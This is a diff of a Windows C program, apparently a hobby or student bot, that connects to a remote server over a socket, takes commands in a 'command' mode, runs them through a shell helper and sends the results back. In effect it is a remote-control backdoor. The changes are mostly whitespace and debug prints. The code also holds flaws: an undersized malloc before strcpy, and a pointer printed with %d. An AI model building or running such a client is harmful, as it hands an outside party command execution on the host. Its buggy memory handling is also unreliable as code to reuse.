@@ -15,8 +15,7 @@ int main()
     char sentence[1040];
     char* command = NULL;
     char mode[20]= "none";
-
-    
+   
     WSAStartup(MAKEWORD(2,0), &WSAData);
     /* Tout est configuré pour se connecter sur IRC, haarlem, Undernet. */
     sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -25,9 +24,6 @@ int main()
     sin.sin_port = htons(7891);
 
     connect(sock, (SOCKADDR *)&sin, sizeof(sin));
-
-
-	
 	//Empyty buffer;
 	memset(buffer, 0, sizeof(buffer));
 	while(1){
@@ -48,13 +44,11 @@ int main()
 			command = malloc((strlen(buffer))*sizeof(char)); //allocation du pointer
 			strcpy(command,buffer);
 			printf("go\n");
+			printf("command envoyée : %d\n", command );
 			char* path = shellcommand(command);
-			printf("%s\n", "no go\n");
+			printf("le path est : %s\n", path);
 			send(sock, path, (strlen(path))*sizeof(char), 0);
-
-		}	
-		 
-	
+		}	 
 		//Fixe le mode en fonction de la commande envoyée
 		//si command, on passen mode commande
 		if(strcmp(buffer,"command\n") == 0){
@@ -76,12 +70,7 @@ int main()
 			char message[] = "everything is desactivated \n";
 			send(sock,message,strlen(message),0);	
 		}
-		
-
-
-		
 	}
-	
     closesocket(sock);
     WSACleanup();
     return 0;
